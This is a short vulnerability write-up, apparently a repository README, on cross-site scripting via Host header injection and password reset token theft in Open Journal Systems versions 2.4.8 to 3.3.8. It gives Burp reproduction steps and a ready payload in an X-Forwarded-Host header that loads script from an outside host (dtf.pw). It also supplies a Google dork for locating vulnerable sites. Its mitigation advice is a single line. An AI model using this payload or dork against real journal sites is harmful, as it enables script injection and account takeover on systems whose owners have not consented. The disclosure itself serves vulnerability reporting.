CVE-2022-24181 and CVE-2022-26616. both are probably same
# Open-journal-system-Vulnerability
XSS via Host Header injection and Steal  Password Reset Token of another user
Step to reproduce:
1) Go to this site: https://who's-using-ojs-software.com
2) And capture this request in burp , and send to repeater.
3) Add this after Host Header  X-Forwarded-Host: foo"><script src=//dtf.pw/2.js></script><x=".com
4) And this click on send , after this right click on request and click on show response in browser , after this copy the request.
5) Paste this request in browser , and you'll see xss pop-up.
Mitigation: Update to newer version.

Google Dork to find This vulnerability
intitle:ojs
This vulnerability in PKP vendor software Open-journal-system version 2.4.8 to 3.3.8 all are vulnerable to xss via Host Header injection and steal password reset token vulnerability
